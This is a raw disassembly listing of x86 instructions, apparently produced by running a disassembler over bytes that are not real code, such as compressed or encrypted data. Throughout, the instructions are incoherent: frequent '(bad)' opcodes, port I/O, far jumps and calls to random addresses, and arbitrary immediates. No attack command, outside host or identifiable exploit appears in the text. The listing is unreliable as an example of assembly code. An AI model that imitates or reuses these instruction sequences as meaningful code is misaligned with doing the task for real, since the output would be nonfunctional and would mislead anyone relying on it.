  418dd7:	add    DWORD PTR ds:0x6c98e98f,ebp
  418ddd:	sbb    DWORD PTR [edi-0x37],0x274e4468
  418de4:	test   DWORD PTR [eax+esi*1-0x2c],0x2b4b4d1f
  418dec:	in     al,dx
  418ded:	or     al,0xc3
  418def:	add    eax,0x56d9a15d
  418df4:	jb     0x418e22
  418df6:	xor    bh,ch
  418df8:	fcmovne st,st(5)
  418dfa:	adc    BYTE PTR [ebp-0x79],bh
  418dfd:	jmp    0x1d9bbabf
  418e02:	rcl    DWORD PTR [ebp-0x4bbf3b2],1
  418e08:	(bad)  
  418e09:	in     al,dx
  418e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e0b:	and    BYTE PTR [ecx],0x8c
  418e0e:	xor    DWORD PTR [ebp-0x5e],ebp
  418e11:	mov    ds:0x15d53dc8,al
  418e16:	in     eax,0x83
  418e18:	repz pop eax
  418e1a:	mov    edi,0xb083c929
  418e1f:	mov    esp,esi
  418e21:	cmp    edi,DWORD PTR [edx]
  418e23:	jmp    0x418dc9
  418e25:	(bad)  
  418e26:	push   edi
  418e27:	and    dl,0x3f
  418e2a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e2b:	ret    
  418e2c:	cdq    
  418e2d:	cmp    BYTE PTR [edx],al
  418e2f:	cmp    eax,0x90148334
  418e34:	sahf   
  418e35:	imul   edx,DWORD PTR ds:0x1eb7efdd,0xffffffaf
  418e3c:	sbb    edi,eax
  418e3e:	xor    al,0xae
  418e40:	into   
  418e41:	les    eax,FWORD PTR [ebx-0x60]
  418e44:	push   edx
  418e45:	icebp  
  418e46:	pushf  
  418e47:	aaa    
  418e48:	cmp    BYTE PTR ds:0xdfaaafe6,cl
  418e4e:	jnp    0x418e6b
  418e50:	arpl   WORD PTR [ecx+0x5c],bp
  418e53:	cmp    DWORD PTR [edi-0x28],eax
  418e56:	lds    edx,FWORD PTR [edi+0x19]
  418e59:	aam    0xaa
  418e5b:	ins    DWORD PTR es:[edi],dx
  418e5c:	mov    dl,0xcc
  418e5e:	cld    
  418e5f:	popa   
  418e60:	dec    ecx
  418e61:	push   es
  418e62:	add    BYTE PTR [ecx+0x57f686bd],cl
  418e68:	loope  0x418e97
  418e6a:	mov    eax,0x3343fffb
  418e6f:	into   
  418e70:	xor    DWORD PTR [ebp+eiz*8-0x26],ebp
  418e74:	ins    DWORD PTR es:[edi],dx
  418e75:	pop    ecx
  418e76:	in     al,dx
  418e77:	jns    0x418e03
  418e79:	out    dx,eax
  418e7a:	push   ecx
  418e7b:	jo     0x418ee7
  418e7d:	cs nop
  418e7f:	pushf  
  418e80:	pop    ds
  418e81:	mov    dl,bl
  418e83:	adc    ch,ch
  418e85:	inc    edi
  418e86:	idiv   BYTE PTR [ecx+0x1f5eac40]
  418e8c:	pop    esi
  418e8d:	cmc    
  418e8e:	pop    esi
  418e8f:	ja     0x418e12
  418e91:	mov    es,WORD PTR [ebx+0x55]
  418e94:	mov    cl,0x28
  418e96:	push   ebx
  418e97:	ds xchg ecx,eax
  418e99:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e9a:	xchg   BYTE PTR [ebx+0x48],cl
  418e9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418e9e:	or     cl,BYTE PTR [ecx-0x7c]
  418ea1:	lods   al,BYTE PTR ds:[esi]
  418ea2:	xchg   edx,eax
  418ea3:	popf   
  418ea4:	sbb    al,0x2b
  418ea6:	adc    eax,0x88ab3ac4
  418eab:	(bad)  
  418eac:	or     ah,BYTE PTR [edi-0x2d]
  418eaf:	pop    ds
  418eb0:	mov    ecx,0x9590dd9e
  418eb5:	pop    es
  418eb6:	lods   al,BYTE PTR ds:[esi]
  418eb7:	int3   
  418eb8:	inc    esp
  418eb9:	clc    
  418eba:	inc    edx
  418ebb:	push   esp
  418ebc:	or     esp,edi
  418ebe:	iret   
  418ebf:	jg     0x418e6b
  418ec1:	mov    bl,0x9c
  418ec3:	in     eax,0xc1
  418ec5:	mov    ?,WORD PTR [esi]
  418ec7:	mov    al,0x63
  418ec9:	jle    0x418e4d
  418ecb:	test   DWORD PTR [ecx-0x280343a4],ebx
  418ed1:	or     bl,BYTE PTR [ebx+0x3c]
  418ed4:	sbb    al,0x92
  418ed6:	or     ebx,DWORD PTR [esi-0x72]
  418ed9:	xchg   esi,eax
  418eda:	fidivr DWORD PTR [ecx+0x49b68e90]
  418ee0:	pop    es
  418ee1:	sbb    esi,DWORD PTR [ecx]
  418ee3:	inc    ebp
  418ee4:	(bad)  
  418ee5:	jmp    0xd92b:0x29083e87
  418eec:	mul    BYTE PTR [ebx+ebp*8-0x7260ea62]
  418ef3:	repnz pop ss
  418ef5:	dec    esp
  418ef6:	repnz cli 
  418ef8:	int    0xb3
  418efa:	mov    ebp,0x992b3e01
  418eff:	test   DWORD PTR [ebp-0x39],eax
  418f02:	push   ebx
  418f03:	mov    ebp,0x19806a8
  418f08:	xor    eax,0x969799d
  418f0d:	dec    ebx
  418f0e:	pop    esi
  418f0f:	cmp    eax,0x9f1269a7
  418f14:	mov    al,0x6a
  418f16:	jecxz  0x418f8b
  418f18:	(bad)  
  418f1a:	lahf   
  418f1b:	imul   edi,eax,0x4572cd3f
  418f21:	cdq    
  418f22:	cmc    
  418f23:	push   edx
  418f24:	repz ja 0x418f47
  418f27:	xor    DWORD PTR [ebp-0x59ce968b],0x3ee0c736
  418f31:	pop    esp
  418f32:	inc    esp
  418f33:	mov    dh,0x2c
  418f35:	int    0x3e
  418f37:	test   esp,0x54e4f547
  418f3d:	add    ebp,edx
  418f3f:	out    dx,al
  418f40:	cdq    
  418f41:	push   esi
  418f42:	bound  esp,QWORD PTR ds:0xa4cc634b
  418f48:	push   ebx
  418f49:	adc    DWORD PTR [ecx],ebp
  418f4b:	pop    esi
  418f4c:	cmp    cl,BYTE PTR [ebp+edi*1+0x4125d7c4]
  418f53:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  418f55:	out    dx,al
  418f56:	repnz or eax,0xdeec91b7
  418f5c:	out    0x86,al
  418f5e:	jo     0x418f46
  418f60:	sahf   
  418f61:	and    ecx,DWORD PTR [edi+0xf684b9a]
  418f67:	mov    cl,0x56
  418f69:	sub    ch,BYTE PTR [esi+esi*1+0x3a]
  418f6d:	je     0x418f57
  418f6f:	(bad)  
  418f71:	stc    
  418f72:	fdivr  st(3),st
  418f74:	cwde   
  418f75:	stc    
  418f76:	adc    eax,0x70188118
  418f7b:	jmp    0x50d7a0e4
  418f80:	sahf   
  418f81:	add    DWORD PTR [ecx-0x4f0462e0],ecx
  418f87:	icebp  
  418f88:	add    BYTE PTR [ebx],cl
  418f8a:	dec    eax
  418f8b:	mov    BYTE PTR [ebx+0x6d60a238],ah
  418f91:	in     al,dx
  418f92:	cwde   
  418f93:	das    
  418f94:	jbe    0x418f51
  418f96:	and    DWORD PTR [edx-0x2e],edi
  418f99:	xor    eax,0xf16a3c38
  418f9e:	sbb    eax,0x7fd758a2
  418fa3:	popf   
  418fa4:	mov    DWORD PTR [esi],ebx
  418fa6:	cmp    ebp,ebp
  418fa8:	or     eax,edx
  418faa:	dec    esi
  418fab:	mov    ah,0xe3
  418fad:	pushf  
  418fae:	sub    eax,0x1f8ad7c0
  418fb3:	mov    dh,0xa8
  418fb5:	sbb    al,0xdf
  418fb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418fb8:	inc    edx
  418fb9:	dec    edx
  418fba:	mov    ch,BYTE PTR [esi]
  418fbc:	mov    dh,bl
  418fbe:	sbb    ecx,ebx
  418fc0:	sti    
  418fc1:	mov    ds:0x5b166e5c,al
  418fc6:	(bad)
  418fc9:	mov    edx,0x6585ee40
  418fce:	jae    0x419045
  418fd0:	loop   0x418f77
  418fd2:	rol    DWORD PTR [ebx],0x14
  418fd5:	in     al,0xbf
  418fd7:	xchg   edx,eax
  418fd8:	shr    DWORD PTR [ebx+0x2f],cl
  418fdb:	leave  
  418fdc:	lea    ebx,[ebx-0x49e3c534]
  418fe2:	mov    ?,WORD PTR ds:0x557a14ef
  418fe8:	std    
  418fe9:	pop    ecx
  418fea:	ins    DWORD PTR es:[edi],dx
  418feb:	nop
  418fec:	shl    DWORD PTR [esi],0xec
  418fef:	jmp    0xea41ca8c
  418ff4:	sbb    ebp,esi
  418ff6:	into   
  418ff7:	and    esi,DWORD PTR [edi]
  418ff9:	xchg   esi,eax
  418ffa:	imul   ecx,ebp,0xb
  418ffd:	add    esi,ecx
  418fff:	mov    cl,0x69
  419001:	mov    edx,0x3c9ae724
  419006:	mov    BYTE PTR [ecx*1-0x38562d6a],dl
  41900d:	call   0x8238:0x88dfd522
  419014:	or     eax,0x24224955
  419019:	popa   
  41901a:	sahf   
  41901b:	inc    edx
  41901c:	mov    dl,0xe3
  41901e:	lock mov WORD PTR [edi+0x14],?
  419022:	fldcw  WORD PTR [edx]
  419024:	mov    BYTE PTR [edi+0x62d7a440],dl
  41902a:	adc    ebx,DWORD PTR ds:0x213c2023
  419030:	inc    eax
  419031:	jns    0x4190af
  419033:	mov    ah,0x17
  419035:	es mov bl,0xed
  419038:	inc    ebx
  419039:	jne    0x419021
  41903b:	add    eax,0xb96eaec1
  419040:	ins    BYTE PTR es:[edi],dx
  419041:	adc    al,0x32
  419043:	fiadd  WORD PTR [eax-0xb]
  419046:	rcl    BYTE PTR [edi+0x16],1
  419049:	retf   0x3245
  41904c:	mov    ebx,0x14153e80
  419051:	push   ss
  419052:	js     0x4190a5
  419054:	cmp    eax,0x6ebdcecd
  419059:	pop    edi
  41905a:	jmp    0x419077
  41905c:	outs   dx,DWORD PTR ds:[esi]
  41905d:	call   0x3bb96c18
  419062:	xor    BYTE PTR [ecx+0x2429f8f8],dh
  419068:	xor    eax,0xe416d0dd
  41906d:	clc    
  41906e:	lahf   
  41906f:	aad    0xca
  419071:	or     dl,ch
  419073:	push   eax
  419074:	push   ecx
  419075:	and    eax,0x69289723
  41907a:	ss jb  0x419002
  41907d:	and    cl,BYTE PTR [ecx+0x510b0413]
  419083:	dec    ecx
  419084:	ins    BYTE PTR es:[edi],dx
  419085:	sbb    DWORD PTR [esi+esi*8],ebp
  419088:	and    BYTE PTR [eax+0x1c],0xed
  41908c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41908d:	retf   0x29a6
  419090:	xchg   esp,eax
  419091:	jnp    0x41907a
  419093:	in     al,0x84
  419095:	js     0x419073
  419097:	mov    esi,0x2cf497
  41909c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41909d:	popf   
  41909e:	ficom  WORD PTR [ebx+0x6dd2be65]
  4190a4:	mov    ds:0x491013e9,eax
  4190a9:	repz scas al,BYTE PTR es:[edi]
  4190ab:	pop    edx
  4190ac:	call   0x16a7d99
  4190b1:	mov    DWORD PTR [edi+0x7bc1daf4],ebp
  4190b7:	cdq    
  4190b8:	sbb    eax,0xa670c4ce
  4190bd:	adc    al,dl
  4190bf:	or     eax,0xcb03f20d
  4190c4:	xor    al,0xbd
  4190c6:	dec    ebp
  4190c7:	pop    ebx
  4190c8:	xchg   BYTE PTR [esi-0x513828d0],bl
  4190ce:	sub    al,0x17
  4190d0:	inc    esi
  4190d1:	adc    esi,ebp
  4190d3:	call   0x59297393
  4190d8:	adc    DWORD PTR [eax-0x78e2d16],0xaf303ca2
  4190e2:	mov    dl,0x96
  4190e4:	shl    DWORD PTR [ebx-0x75],cl
  4190e7:	test   BYTE PTR [edi+ecx*1],ch
  4190ea:	les    ecx,FWORD PTR [edx+0x33]
  4190ed:	stos   DWORD PTR es:[edi],eax
  4190ee:	jge    0x4190b3
  4190f0:	xor    ebx,0xffffff8a
  4190f3:	mov    edx,es
  4190f5:	pop    ebx
  4190f6:	int3   
  4190f7:	jo     0x419156
  4190f9:	or     eax,0xbd13ea90
  4190fe:	jae    0x419101
  419100:	mov    edx,0xf6410d09
  419105:	push   ss
  419106:	dec    edi
  419107:	pop    ds
  419108:	or     edx,DWORD PTR [edi-0x59]
  41910b:	lahf   
  41910c:	pop    edi
  41910d:	pushf  
  41910e:	mov    fs,edi
  419110:	lock mov dl,0x57
  419113:	mov    ecx,cs
  419115:	or     DWORD PTR [ebx-0x6aaa21bd],0x9c5b8511
  41911f:	retf   0x6778
  419122:	push   ds
  419123:	sub    BYTE PTR [edi],cl
  419125:	loope  0x419148
  419127:	int    0x40
  419129:	inc    edx
  41912a:	mov    eax,0xe9ac6871
  41912f:	push   edx
  419130:	fild   QWORD PTR [edx+0x2db73fae]
  419136:	mov    eax,ds:0x7b437578
  41913b:	xor    al,0x21
  41913d:	inc    edx
  41913e:	rcl    DWORD PTR [edx-0x7ba00f19],1
  419144:	repnz xlat BYTE PTR ds:[ebx]
  419146:	mov    dl,0x37
  419148:	mov    dl,0xf9
  41914a:	out    dx,al
  41914b:	or     BYTE PTR [ecx+eax*2+0x63],al
  41914f:	mov    dh,0xb1
  419151:	shr    esp,0x77
  419154:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  419156:	xchg   esi,eax
  419157:	jmp    FWORD PTR [edx+0x1e]
  41915a:	and    DWORD PTR [esi],esp
  41915c:	adc    eax,0x43afadc2
  419161:	shrd   DWORD PTR [ebp+0x52],esi,cl
  419165:	jge    0x419133
  419167:	test   eax,0x5f704d37
  41916c:	loope  0x41916c
  41916e:	cdq    
  41916f:	adc    eax,0x14f2b852
  419174:	outs   dx,BYTE PTR ds:[esi]
  419175:	adc    cl,bl
  419177:	test   ah,cl
  419179:	cmp    esp,edi
  41917b:	and    DWORD PTR ds:0xc01df63c,ebp
  419181:	adc    ebx,DWORD PTR [ebp-0x1]
  419184:	fst    DWORD PTR [ebp-0x1]
  419187:	pop    esi
  419188:	test   DWORD PTR [esi+ebp*4],ebx
  41918b:	adc    al,0x2e
  41918d:	bound  esi,QWORD PTR [edx+0x10]
  419190:	lock enter 0xe967,0xcc
  419195:	nop
  419196:	aas    
  419197:	repnz sbb BYTE PTR [esi+eiz*1],ah
  41919b:	daa    
  41919c:	nop
  41919d:	sahf   
  41919e:	push   0xce25e0cf
  4191a3:	repnz in al,dx
  4191a5:	fsubr  DWORD PTR [edi]
  4191a7:	not    BYTE PTR [edi]
  4191a9:	jno    0x419133
  4191ab:	cmp    cl,BYTE PTR [esp+esi*2-0x5bc132b4]
  4191b2:	xchg   BYTE PTR [ebp-0x64],cl
  4191b5:	push   ds
  4191b6:	fmul   QWORD PTR [edi+0x43]
  4191b9:	inc    esp
  4191ba:	fs or  eax,0x221d93be
  4191c0:	fisubr WORD PTR [edi+ecx*4]
  4191c3:	rcl    ch,1
  4191c5:	out    dx,al
  4191c6:	(bad)  
  4191c7:	sbb    dh,al
  4191c9:	push   es
  4191ca:	adc    al,0x26
  4191cc:	loope  0x419154
  4191ce:	xor    bl,BYTE PTR [ebx+0x4a]
  4191d1:	jbe    0x4191b1
  4191d3:	or     al,0x97
  4191d5:	sub    eax,0xd5961173
  4191da:	loop   0x419239
  4191dc:	addr16 jb 0x41920e
  4191df:	sub    DWORD PTR [edx+0x10d7510c],esp
  4191e5:	and    eax,0xa6c4ff20
  4191ea:	push   edx
  4191eb:	rol    BYTE PTR [ecx+0x2d],0xab
  4191ef:	and    eax,0x2883bf8d
  4191f4:	mov    ah,0x8f
  4191f6:	std    
  4191f7:	data16 jno 0x4191cd
  4191fa:	loopne 0x4191af
  4191fc:	call   0xd4ab:0x10edb375
  419203:	xchg   BYTE PTR [eax+0x103a9456],dh
  419209:	push   ebx
  41920a:	xchg   esi,eax
  41920b:	add    DWORD PTR [ebx],eax
  41920d:	mov    eax,0x19bc531c
  419212:	rcl    BYTE PTR [ecx],1
  419214:	pop    eax
  419215:	mov    esi,0x188657ce
  41921a:	retf   
  41921b:	push   ebp
  41921c:	and    DWORD PTR [edx],ecx
  41921e:	rcl    DWORD PTR [ecx+eiz*1],0xbe
  419222:	or     ebp,DWORD PTR [edi+ebp*4-0x73]
  419226:	call   0x5962a97c
  41922b:	fs mov edx,0x317ab6d
  419231:	push   0xffffffa6
  419233:	sub    al,0x53
  419235:	lock int3 
  419237:	mov    eax,ds:0x48204064
  41923c:	lahf   
  41923d:	test   eax,0x5f562f54
  419242:	mov    esi,0xd8b67b17
  419247:	cmp    DWORD PTR [esi],eax
  419249:	enter  0xac90,0xb7
  41924d:	mov    cl,0x67
  41924f:	scas   al,BYTE PTR es:[edi]
  419250:	(bad)  
  419251:	mov    ah,0x66
  419253:	cmp    eax,0x3afe57bc
  419258:	ds and ebx,ecx
  41925b:	arpl   di,bp
  41925d:	sbb    DWORD PTR [edx],edx
  41925f:	out    0x7c,eax
  419261:	nop
  419262:	call   0x8c00bc90
  419267:	push   cs
  419268:	stc    
  419269:	cli    
  41926a:	das    
  41926b:	push   edi
  41926c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41926d:	(bad)  
  41926e:	ja     0x419212
  419270:	nop
  419271:	popf   
  419272:	sub    al,0x2
  419274:	mov    al,ds:0xe9dbf843
  419279:	rol    BYTE PTR es:[eax-0x54c4a12f],1
  419280:	inc    esi
  419281:	ret    
  419282:	cmp    edx,DWORD PTR [ebx]
  419284:	outs   dx,DWORD PTR ds:[esi]
  419285:	mov    eax,ds:0x9f811f12
  41928a:	repnz popa 
  41928c:	push   ds
  41928d:	pop    edi
  41928e:	sar    DWORD PTR [ecx+0x23],cl
  419291:	inc    eax
  419292:	xchg   ebx,eax
  419293:	in     al,0x39
  419295:	pushf  
  419296:	rcr    DWORD PTR [eax-0x1d1d141],1
  41929c:	mov    ebx,0x11e8771
  4192a1:	xor    DWORD PTR [ebx+eax*1+0x59af5856],esi
  4192a8:	int3   
  4192a9:	mov    ch,0x7
  4192ab:	mov    ds:0x1b1e4179,eax
  4192b0:	ror    BYTE PTR [eax],1
  4192b2:	cmp    al,0xf8
  4192b4:	mov    eax,ds:0xb421eeca
  4192b9:	sbb    eax,0x11f3558b
  4192be:	or     DWORD PTR [ebp-0x15edf2a6],ebp
  4192c4:	dec    eax
  4192c5:	inc    esi
  4192c6:	and    eax,0x3776d841
  4192cb:	or     ah,cl
  4192cd:	aad    0x63
  4192cf:	mov    edx,0xe8b32f05
  4192d4:	sbb    eax,0xee346eee
  4192d9:	fbstp  TBYTE PTR ds:0x26bde09c
  4192df:	pusha  
  4192e0:	aad    0x63
  4192e2:	inc    ebx
  4192e3:	lods   eax,DWORD PTR ds:[esi]
  4192e4:	int3   
  4192e5:	mov    dh,BYTE PTR [ebp+0x2fe50f75]
  4192eb:	jae    0x4192f2
  4192ed:	adc    ebx,0x35
  4192f0:	into   
  4192f1:	imul   edx,DWORD PTR [esi],0xf14cab6e
  4192f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f8:	cmp    DWORD PTR [ebp-0x63b72180],edi
  4192fe:	mov    cx,0x3463
  419302:	cmp    DWORD PTR [ebx-0x6fcb0602],0xffffffe7
  419309:	jecxz  0x4192d0
  41930b:	std    
  41930c:	mov    ebx,0x8155da25
  419311:	call   0xd1f2:0x69c6b4b7
  419318:	ret    
  419319:	lods   eax,DWORD PTR ds:[esi]
  41931a:	scas   eax,DWORD PTR es:[edi]
  41931b:	cs in  eax,dx
  41931d:	stc    
  41931e:	fwait
  41931f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419320:	pop    ebp
  419321:	sub    al,0x21
  419323:	es in  al,dx
  419325:	xor    eax,0xade78799
  41932a:	out    dx,al
  41932b:	call   DWORD PTR [edi+edx*4-0x5635f60f]
  419332:	sub    al,0x64
  419334:	and    DWORD PTR [ebp+0x7a],ecx
  419337:	and    BYTE PTR [ecx-0x5c],bl
  41933a:	cld    
  41933b:	add    al,BYTE PTR [eax]
  41933d:	xor    al,0x3a
  41933f:	jns    0x41930d
  419341:	and    al,0x66
  419343:	in     al,dx
  419344:	test   BYTE PTR [ebp+0x1931da02],bl
  41934a:	into   
  41934b:	test   al,0xf
  41934d:	jb     0x419359
  41934f:	mov    WORD PTR [edx+ecx*8+0x2a],fs
  419353:	out    0x19,al
  419355:	xchg   esi,eax
  419356:	or     esp,DWORD PTR [ecx+0x70851100]
  41935c:	jp     0x419362
  41935e:	xor    dl,BYTE PTR [esp+eax*4-0x41e7d71b]
  419365:	(bad)  
  419366:	sbb    cl,dh
  419368:	stos   BYTE PTR es:[edi],al
  419369:	adc    edi,esp
  41936b:	fs bound ecx,QWORD PTR gs:[edi-0x9]
  419370:	add    al,0xb
  419372:	add    ah,BYTE PTR [ebx+0x732c6332]
  419378:	add    BYTE PTR [ebp-0x4609c8f8],ah
  41937e:	cwde   
  41937f:	cwde   
  419380:	adc    al,0xb3
  419382:	lds    edi,FWORD PTR [ebx-0x2211b5c2]
  419388:	loop   0x4193d7
  41938a:	xor    DWORD PTR [edi-0x637284dd],eax
  419390:	sub    BYTE PTR [edx],0xe6
  419393:	pop    esp
  419394:	add    bl,BYTE PTR [ebx]
  419396:	ret    0x2329
  419399:	int    0x60
  41939b:	aaa    
  41939c:	neg    DWORD PTR [edx+0x4a3c570]
  4193a2:	xor    eax,DWORD PTR [eax-0x69be70cd]
  4193a8:	jns    0x419333
  4193aa:	imul   DWORD PTR [ebx-0x28]
  4193ad:	int3   
  4193ae:	xor    BYTE PTR [ebp+0x73],bl
  4193b1:	mov    bh,0xe8
  4193b3:	mov    ds:0x20b1a209,al
  4193b8:	push   0xffffffd2
  4193ba:	add    DWORD PTR cs:[esi+0x57c8001],ebp
  4193c1:	ret    
  4193c2:	sbb    DWORD PTR [esi-0xd831a94],eax
  4193c8:	cmp    DWORD PTR [edi+0x38fdc415],0xffffff9a
  4193cf:	adc    DWORD PTR [ecx+0x6fedb102],ecx
  4193d5:	and    bh,ah
  4193d7:	int    0x3d
  4193d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193da:	fmul   DWORD PTR [edx+0x239493ef]
  4193e0:	mov    ebp,0x5bd2dc3
  4193e5:	push   ebx
  4193e6:	xchg   ah,bl
  4193e8:	inc    ebp
  4193e9:	in     al,dx
  4193ea:	lahf   
  4193eb:	(bad)  
  4193ec:	cmp    al,0x54
  4193ee:	stos   DWORD PTR es:[edi],eax
  4193ef:	push   0xfffffff0
  4193f1:	add    eax,0xfa4ebbce
  4193f6:	xor    cl,ch
  4193f8:	imul   eax,DWORD PTR [edx-0x71c9212a],0x3a
  4193ff:	mov    BYTE PTR [edi-0x75ef8652],0x3f
  419406:	in     al,dx
  419407:	sbb    eax,0x8fbcc5e0
  41940c:	push   ebp
  41940d:	add    esi,DWORD PTR [edx-0x5a70f020]
  419413:	lahf   
  419414:	loopne 0x419421
  419416:	in     eax,dx
  419417:	dec    ebp
  419418:	jb     0x4193b0
  41941a:	mov    eax,ds:0x68c616a3
  41941f:	cmc    
  419420:	sub    DWORD PTR [eax-0x64],eax
  419423:	test   DWORD PTR [eax+ecx*8+0xd71b45b],ebx
  41942a:	and    eax,0x27f9d0d0
  41942f:	mov    DWORD PTR [edi],ecx
  419431:	sbb    ebp,esi
  419433:	clc    
  419434:	rol    BYTE PTR [eax],cl
  419436:	sbb    BYTE PTR [ecx+ebp*1-0x27],ah
  41943a:	mov    cl,0xe
  41943c:	dec    edi
  41943d:	pop    ecx
  41943e:	push   edx
  41943f:	mov    ds:0xe2a5f412,eax
  419444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419445:	jecxz  0x41946a
  419447:	daa    
  419448:	and    ebp,DWORD PTR [ebx-0x395b8c19]
  41944e:	push   cs
  41944f:	sti    
  419450:	jbe    0x419481
  419452:	cmp    al,0xbf
  419454:	call   0xc556:0x68f39ad2
  41945b:	sbb    al,0xbc
  41945d:	dec    ecx
  41945e:	ret    0x9dfa
  419461:	or     al,0x51
  419463:	push   ebp
  419464:	pop    edx
  419465:	sub    dh,BYTE PTR [ecx]
  419467:	loope  0x4193ef
  419469:	imul   ebx,DWORD PTR [edi],0x3f49e06
  41946f:	stos   DWORD PTR es:[edi],eax
  419470:	data16 into 
  419472:	cmp    eax,0x40fceb07
  419477:	jmp    0x4194f1
  419479:	jmp    0x419429
  41947b:	sbb    DWORD PTR [eax],edi
  41947d:	es jp  0x419485
  419480:	xchg   edx,eax
  419481:	mov    dl,0x42
  419483:	and    DWORD PTR [edx-0x6c],edi
  419486:	stos   DWORD PTR es:[edi],eax
  419487:	mov    dl,BYTE PTR [ebp+0x3c2a523a]
  41948d:	mov    dl,0x41
  41948f:	aaa    
  419490:	popa   
  419491:	loopne 0x419426
  419493:	cli    
  419494:	out    dx,eax
  419495:	enter  0xfe67,0x6d
  419499:	(bad)  
  41949a:	popf   
  41949b:	(bad)  
  41949c:	std    
  41949d:	or     eax,0x83d34442
  4194a2:	aas    
  4194a3:	mov    eax,ds:0x8caf3055
  4194a8:	div    edx
  4194aa:	adc    eax,0x985b07f7
  4194af:	or     DWORD PTR [edx+esi*2],esi
  4194b2:	repnz sub esi,DWORD PTR [ebp+0x11]
  4194b6:	dec    edx
  4194b7:	scas   al,BYTE PTR es:[edi]
  4194b8:	jmp    0x41951d
  4194ba:	in     al,dx
  4194bb:	fistp  QWORD PTR [eax+0x0]
  4194be:	ret    0x4735
  4194c1:	xor    al,0xe1
  4194c3:	xchg   DWORD PTR ds:0x71a068d2,eax
  4194c9:	loop   0x4194c7
  4194cb:	or     al,0x80
  4194cd:	aad    0x70
  4194cf:	dec    ecx
  4194d0:	jg     0x4194bd
  4194d2:	dec    eax
  4194d3:	(bad)  
  4194d4:	xor    BYTE PTR [ebp+ebp*2+0x5e],ah
  4194d8:	mov    ah,0x33
  4194da:	cld    
  4194db:	out    0x2c,eax
  4194dd:	fimul  DWORD PTR [esi]
  4194df:	mov    BYTE PTR [ebx+edi*4-0x28],dl
  4194e3:	and    DWORD PTR [ebx+esi*4-0x1a],ebx
  4194e7:	dec    ebx
  4194e8:	inc    edx
  4194e9:	cli    
  4194ea:	ror    BYTE PTR [esi-0x65ab9be9],1
  4194f0:	in     al,dx
  4194f1:	push   ebx
  4194f2:	jnp    0x419552
  4194f4:	pop    esp
  4194f5:	in     eax,dx
  4194f6:	xchg   DWORD PTR [eax+0x72],ebx
  4194f9:	push   esp
  4194fa:	sar    al,0xe2
  4194fd:	xchg   ebx,eax
  4194fe:	and    bh,BYTE PTR [esi]
  419500:	scas   eax,DWORD PTR es:[edi]
  419501:	fbstp  TBYTE PTR [edx-0x2efe1add]
  419507:	cdq    
  419508:	test   DWORD PTR cs:[edx+0x5bc4af66],esp
  41950f:	arpl   WORD PTR [ecx-0x45f4200d],di
  419515:	mov    al,0xe6
  419517:	into   
  419518:	dec    ecx
  419519:	arpl   WORD PTR [ebp-0x38ae9364],sp
  41951f:	pop    ebp
  419520:	fwait
  419521:	and    eax,0x7d2fb0f4
  419526:	lds    esi,FWORD PTR [ecx+eiz*1]
  419529:	and    al,BYTE PTR [ebp-0x3b86bc87]
  41952f:	xchg   esi,eax
  419530:	mov    bl,0x12
  419532:	pavgw  mm5,QWORD PTR [ebx+0x3a01ffb6]
  419539:	xchg   ecx,eax
  41953a:	pop    edi
  41953b:	push   edi
  41953c:	sub    DWORD PTR [ebp+0x4],0xeafb94f7
  419543:	stos   DWORD PTR es:[edi],eax
  419544:	inc    edi
  419545:	dec    ecx
  419546:	in     eax,0x77
  419548:	cdq    
  419549:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41954a:	sti    
  41954b:	mov    BYTE PTR [edx],0x83
  41954e:	push   ds
  41954f:	mov    eax,0xa19760c4
  419554:	jbe    0x419541
  419556:	and    DWORD PTR [edx-0x67b94032],esp
  41955c:	push   eax
  41955d:	inc    ebp
  41955e:	arpl   WORD PTR [ecx+edi*2-0x3a],ax
  419562:	outs   dx,DWORD PTR ds:[esi]
  419563:	out    0x7b,al
  419565:	mov    dh,0x4
  419567:	or     cl,cl
  419569:	pop    eax
  41956a:	gs scas eax,DWORD PTR es:[edi]
  41956c:	mov    ch,0xd6
  41956e:	aaa    
  41956f:	pop    edi
  419570:	leave  
  419571:	mov    dl,0x48
  419573:	push   edi
  419574:	jle    0x419541
  419576:	mov    ds,WORD PTR [edi-0x3cb5b690]
  41957c:	outs   dx,BYTE PTR ds:[esi]
  41957d:	inc    esi
  41957e:	sbb    DWORD PTR [edi+0xe],0x5c331c57
  419585:	(bad)  
  419587:	pop    ds
  419588:	gs aaa 
  41958a:	ss xor eax,0x16dd7e64
  419590:	or     edx,esi
  419592:	xchg   edx,eax
  419593:	adc    BYTE PTR [eax-0x36],0x42
  419597:	pop    DWORD PTR [ebx]
  419599:	iret   
  41959a:	in     eax,0xaf
  41959c:	sbb    BYTE PTR [ecx-0x797d0252],0x3
  4195a3:	mov    al,ds:0x992ca29e
  4195a8:	repz jmp 0x95c54d3b
  4195ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4195af:	adc    esp,edx
  4195b1:	xchg   edi,eax
  4195b2:	dec    ebp
  4195b3:	fistp  DWORD PTR [esp+ebx*4]
  4195b6:	rcl    cl,0xb2
  4195b9:	jecxz  0x4195ac
  4195bb:	mov    dl,0x85
  4195bd:	cli    
  4195be:	and    al,0x79
  4195c0:	stos   DWORD PTR es:[edi],eax
  4195c1:	std    
  4195c2:	mov    esp,0x52783408
  4195c7:	pop    ecx
  4195c8:	sbb    eax,0x5c76f1d0
  4195cd:	pop    ebx
  4195ce:	pop    edx
  4195cf:	xchg   ebp,eax
  4195d0:	cld    
  4195d1:	gs mov ebx,0x75fab2c9
  4195d7:	call   0xcd20:0x5dc1f60f
  4195de:	ds stc 
  4195e0:	adc    dh,BYTE PTR [ebx-0x16]
  4195e3:	and    cl,BYTE PTR [ecx]
